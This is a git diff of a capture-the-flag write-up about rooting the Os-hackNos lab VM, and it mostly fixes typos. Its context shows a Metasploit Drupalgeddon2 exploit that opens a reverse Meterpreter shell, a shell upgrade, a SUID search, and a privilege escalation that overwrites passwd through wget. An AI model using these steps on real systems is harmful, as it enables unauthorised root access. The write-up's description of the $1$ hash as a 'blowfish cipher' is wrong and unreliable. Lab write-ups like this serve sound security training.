@@ -22,7 +22,7 @@ author: n0khodsia
 
 
 ## LAUNCH
-For this CTF i'll use Kali linux VM on VMWare, and Os-hackNos on VirtualBox (It wont work on VMWare).  
+For this CTF i'll use Kali Linux VM on VMWare, and Os-hackNos on VirtualBox (It wont work on VMWare).  
 First we use `netdiscover` to find out the machine's IP:
 ```bash
  Currently scanning: 192.168.19.0/16   |   Screen View: Unique Hosts                   
@@ -34,7 +34,7 @@ First we use `netdiscover` to find out the machine's IP:
  192.168.1.103   08:00:27:f9:4e:c0      1      60  PCS Systemtechnik GmbH              
 ```
 
-Then we match the hostname `ctf` to the machin'es IP:
+Then we match the hostname `ctf` to the machine's IP:
 ```bash
 root@kali:~# nano /etc/hosts
 27.0.0.1       localhost
@@ -87,7 +87,7 @@ GENERATED WORDS: 4612
 Looks like the server hosts a version of [Drupal CMS](https://www.drupal.org/) on `http://ctf/drupal`.
 The first thing that comes to my mind is trying **Drupalgeddon1/2/3** exploits.
 
-Let's launch `Metasploit` and try to use of of those exploits:
+Let's launch `Metasploit` and try to use those exploits:
 ```bash
 msf5 > search drupal
 
@@ -111,7 +111,7 @@ msf5 > use exploit/unix/webapp/drupal_drupalgeddon2
 
 We'll try the module `drupal_drupalgeddon2`, and view it's settings:
 ```bash
-msf5 exploit(unix/webapp/drupal_drupalgeddon2) > show options 
+msf5 exploit(unix/webapp/drupal_drupalgeddon2) > show options
 
 Module options (exploit/unix/webapp/drupal_drupalgeddon2):
 
@@ -144,13 +144,13 @@ msf5 exploit(unix/webapp/drupal_drupalgeddon2) > set TARGETURI /drupal
 TARGETURI => /drupal
 msf5 exploit(unix/webapp/drupal_drupalgeddon2) > run
 
-[*] Started reverse TCP handler on 192.168.1.104:4444 
+[*] Started reverse TCP handler on 192.168.1.104:4444
 [*] Sending stage (38247 bytes) to 192.168.1.103
 [*] Meterpreter session 1 opened (192.168.1.104:4444 -> 192.168.1.103:54218) at 2019-12-01 07:55:14 -0500
 ```
 Piece of cake, we now have RCE on the machine via the user `www-data`.
 
-##Privillege Escalation
+##Privilege Escalation
 
 On meterpreter, we'll type `shell` to drop into the machine's shell:
 ```bash
@@ -164,7 +164,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 To be able to use `su` and various other features, we need to upgrade the shell using the python module `pty`:
 ```shell
 python3 -c 'import pty; pty.spawn("/bin/bash")'
-www-data@hackNos:/var/www/html/drupal$ 
+www-data@hackNos:/var/www/html/drupal$
 ```
 
 We can already find the user flag within `/home/james`:
@@ -179,7 +179,7 @@ www-data@hackNos:/var/www/html/drupal$ cat /home/james/user.txt
 cat /home/james/user.txt
    _                                  
   | |                                 
- / __) ______  _   _  ___   ___  _ __ 
+ / __) ______  _   _  ___   ___  _ __
  \__ \|______|| | | |/ __| / _ \| '__|
  (   /        | |_| |\__ \|  __/| |   
   |_|          \__,_||___/ \___||_|   
@@ -219,7 +219,7 @@ www-data@hackNos:/var/www/html/drupal$ find / -perm /4000 2>/dev/null
 /bin/fusermount
 ```
 
-The list above shows us binaries with root SUID, meaning that even when a low-priviliged user executes them,
+The list above shows us binaries with root SUID, meaning that even when a low-privileged user executes them,
 they do it with root privileges.
 
 The first thing that catches my eye on that list is `wget`.  
@@ -233,7 +233,7 @@ root@kali:~# openssl passwd -1 -salt 123 mypass
 $1$123$vsQKzM4VDo/EkpS99uCM70
 ```
 
-This creates a blowfish chiper password `mypass`, with *1* rotation, using the salt *123*.
+This creates a blowfish cipher password `mypass`, with *1* rotation, using the salt *123*.
 
 Next, we copy our Kali's passwd file and add our new user & password to it:
 ```bash
@@ -282,13 +282,13 @@ And root root flag:
 root@hackNos:/var/www/html/drupal# ls /root
 ls /root
 root.txt
-root@hackNos:/var/www/html/drupal# cat /root/root.txt	
+root@hackNos:/var/www/html/drupal# cat /root/root.txt    
 cat /root/root.txt
     _  _                              _   
   _| || |_                           | |  
- |_  __  _|______  _ __  ___    ___  | |_ 
+ |_  __  _|______  _ __  ___    ___  | |_
   _| || |_|______|| '__|/ _ \  / _ \ | __|
- |_  __  _|       | |  | (_) || (_) || |_ 
+ |_  __  _|       | |  | (_) || (_) || |_
    |_||_|         |_|   \___/  \___/  \__|
                                           
                                           
@@ -300,7 +300,7 @@ Author : Rahul Gehlaut
 Linkedin : https://www.linkedin.com/in/rahulgehlaut/
 
 Blog : www.hackNos.com
-root@hackNos:/var/www/html/drupal# 
+root@hackNos:/var/www/html/drupal#
 ```
 
 
